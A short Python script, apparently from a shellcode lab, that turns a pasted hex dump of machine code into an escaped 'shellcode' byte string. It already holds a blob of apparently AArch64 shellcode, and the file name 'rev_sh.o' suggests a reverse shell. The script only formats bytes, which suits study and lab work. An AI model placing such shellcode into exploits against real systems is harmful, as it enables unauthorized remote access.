#!/usr/bin/python3

# Run "xxd -p -c 20 rev_sh.o",
# copy and paste the machine code to the following:
ori_sh ="""
ab0501100c0484d273010ccb2901094a
280580d2696a2838880580d2696a2838e81d80d2
696a2838090480d2e90309cb690209cb080108ca
696a28f8080180d2490580d2e90309cb690209cb
696a28f8080280d2090680d2e90309cb690209cb
696a28f8080380d2290109ca696a28f8090480d2
e90309cb690209cbe00309aae10313aa940214ca
e20314aaa81b80d2e16602d4
"""

sh = ori_sh.replace("\n", "")

length  = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = 'shellcode= (\n' + '   "'
for i in range(length):
    s += "\\x" + sh[2*i] + sh[2*i+1]
    if i > 0 and i % 16 == 15: 
       s += '"\n' + '   "'
s += '"\n' + ").encode('latin-1')"
print(s)


